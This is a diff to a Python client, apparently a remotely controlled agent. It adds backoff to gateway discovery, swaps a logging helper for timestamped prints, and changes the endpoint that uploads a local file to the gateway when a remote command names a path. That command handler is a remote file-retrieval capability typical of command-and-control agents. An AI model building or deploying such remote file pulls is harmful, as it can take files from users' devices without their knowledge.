@@ -114,20 +114,28 @@ class DynamicGateway:
         # Re-discover if no current, or if it's been >5 minutes since last check
         if cls._current and (time.time() - cls._last_discovery) < 300:
             return cls._current
+            
+        # Prevent rapid polling if all gateways are offline
+        if getattr(cls, "_last_failed", 0) and (time.time() - getattr(cls, "_last_failed", 0)) < 30:
+            return _BASE_GATEWAY
+
         # Always re-probe to confirm current gateway is alive
         for gw in FALLBACKS:
             try:
                 r = session.get(f"{gw}/health", timeout=3)
                 if r.status_code == 200:
                     if cls._current != gw:
-                        noir_log(f"[MESH] Auto-Discovery: Gateway locked -> {gw}")
+                        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [INFO] [MESH] Auto-Discovery: Gateway locked -> {gw}")
                     cls._current = gw
                     cls._failure_count = 0
                     cls._last_discovery = time.time()
+                    setattr(cls, "_last_failed", 0)
                     return gw
             except: pass
-        noir_log(f"[MESH] All gateways unreachable. Using base: {_BASE_GATEWAY}", level="WARNING")
+        
+        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [WARNING] [MESH] All gateways unreachable. Using base: {_BASE_GATEWAY}")
         cls._current = None  # Force re-probe next call
+        setattr(cls, "_last_failed", time.time())
         return _BASE_GATEWAY
 
     @classmethod
@@ -136,7 +144,7 @@ class DynamicGateway:
         cls._current = None
         cls._last_discovery = 0
         cls._failure_count += 1
-        noir_log(f"[MESH] Gateway reset triggered. Failure count: {cls._failure_count}")
+        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [INFO] [MESH] Gateway reset triggered. Failure count: {cls._failure_count}")
 
 # --- NEURAL MESH HANDSHAKE (v19.6) ---
 class NeuralHandshake:
@@ -846,7 +854,7 @@ class SovereignApp(App):
                     try:
                         with open(path, "rb") as f:
                             files = {"file": (os.path.basename(path), f, "application/octet-stream")}
-                            requests.post(f"{GATEWAY_URL}/agent/asset", headers={"Authorization": f"Bearer {API_KEY}"}, files=files, timeout=60)
+                            requests.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files=files, timeout=60)
                         noir_log(f"[REMOTE] File uploaded: {path}")
                         self._report_result(cmd_id, {"success": True, "path": path})
                     except Exception as e:
